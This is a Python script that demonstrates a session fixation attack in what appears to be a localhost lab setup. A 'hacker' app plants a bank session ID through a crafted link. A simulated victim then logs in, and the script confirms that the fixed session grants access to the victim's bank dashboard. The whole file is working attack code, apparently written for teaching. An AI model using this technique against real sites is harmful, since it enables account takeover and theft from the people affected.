#!/usr/bin/env python3
"""
Session Fixation Verification Script
This script demonstrates how the hacker can verify their session ID works on the bank account.
"""

import requests

def verify_session_fixation():
    print("🔍 SESSION FIXATION VERIFICATION")
    print("=" * 50)
    print("This script shows how the hacker verifies their session ID works on the bank.")
    print()
    
    # Step 1: Hacker visits bank and gets session ID
    print("🎯 STEP 1: Hacker visits bank and gets session ID")
    print("-" * 40)
    
    hacker_session = requests.Session()
    response = hacker_session.get("http://localhost:5001/bank/login")
    
    # Get session cookie from bank
    session_cookies = [name for name in hacker_session.cookies.keys() if 'session' in name.lower()]
    if session_cookies:
        bank_session_id = hacker_session.cookies[session_cookies[0]]
        print(f"✅ Hacker captured bank session ID: {bank_session_id}")
    else:
        print("❌ No session cookie found from bank")
        return
    
    # Step 2: Hacker creates malicious link
    print(f"\n🎯 STEP 2: Hacker creates malicious link")
    print("-" * 40)
    
    malicious_url = f"http://localhost:5000/login?session_id={bank_session_id}"
    print(f"📧 Hacker sends this link to victim: {malicious_url}")
    
    # Step 3: Simulate victim visiting malicious link
    print(f"\n🎯 STEP 3: Victim visits malicious link")
    print("-" * 40)
    
    victim_session = requests.Session()
    response = victim_session.get(malicious_url)
    
    # Get victim's session ID
    session_cookies = [name for name in victim_session.cookies.keys() if 'session' in name.lower()]
    if session_cookies:
        victim_session_id = victim_session.cookies[session_cookies[0]]
        print(f"✅ Victim now has session ID: {victim_session_id}")
        
        # Verify session IDs match
        if bank_session_id == victim_session_id:
            print("✅ SUCCESS: Victim has the same session ID as hacker!")
        else:
            print("❌ FAILED: Session IDs don't match")
            return
    else:
        print("❌ No session cookie found")
        return
    
    # Step 4: Simulate victim logging in
    print(f"\n🎯 STEP 4: Victim logs in on hacker's site")
    print("-" * 40)
    
    login_data = {'username': 'john', 'password': 'john123'}
    response = victim_session.post("http://localhost:5000/login", data=login_data)
    
    # Get session ID after login
    session_cookies = [name for name in victim_session.cookies.keys() if 'session' in name.lower()]
    if session_cookies:
        login_session_id = victim_session.cookies[session_cookies[0]]
        print(f"✅ Session ID after login: {login_session_id}")
        
        # Verify session ID didn't change
        if login_session_id == victim_session_id:
            print("✅ SUCCESS: Session ID unchanged after login (VULNERABLE!)")
        else:
            print("❌ FAILED: Session ID changed after login (SECURE)")
            return
    else:
        print("❌ No session cookie after login")
        return
    
    # Step 5: Hacker verifies they can access victim's bank account
    print(f"\n🎯 STEP 5: Hacker verifies access to victim's bank account")
    print("-" * 40)
    
    # Hacker uses the same session ID to access bank
    hacker_session.cookies.set('session', login_session_id, domain='localhost')
    response = hacker_session.get("http://localhost:5001/bank/dashboard")
    
    print(f"🔍 Hacker tries to access bank dashboard...")
    print(f"📊 Status Code: {response.status_code}")
    print(f"🌐 URL: {response.url}")
    
    if response.status_code == 200:
        print("✅ SUCCESS: Hacker can access victim's bank account!")
        print("🚨 VULNERABILITY CONFIRMED: Session fixation attack successful!")
        
        # Check if we can see account information
        if 'john' in response.text:
            print("✅ Hacker can see victim's account information!")
            print("💰 Hacker can see victim's balance, account number, etc.")
        else:
            print("❌ Cannot see victim's account information")
            
    else:
        print("❌ FAILED: Hacker cannot access victim's bank account")
        print("✅ This means the session fixation attack was prevented!")
    
    # Step 6: Final verification
    print(f"\n🔍 FINAL VERIFICATION")
    print("-" * 40)
    print(f"Bank session ID (hacker's): {bank_session_id}")
    print(f"Victim session ID: {victim_session_id}")
    print(f"Session ID after login: {login_session_id}")
    
    if bank_session_id == victim_session_id == login_session_id:
        print("\n🎯 PERFECT! Session Fixation Attack Successful!")
        print("✅ All session IDs are identical")
        print("✅ Hacker can access victim's bank account")
        print("🚨 VULNERABILITY CONFIRMED!")
    else:
        print("\n❌ Session Fixation Attack Failed")
        print("Session IDs are different")
        print("✅ This means the bank is secure against session fixation")

if __name__ == '__main__':
    print("Make sure both apps are running:")
    print("  - Bank app: python bank_app.py (port 5001)")
    print("  - Hacker app: python vulnerable_app.py (port 5000)")
    print()
    
    try:
        verify_session_fixation()
    except Exception as e:
        print(f"Error: {e}")
        print("Make sure both apps are running on the correct ports") 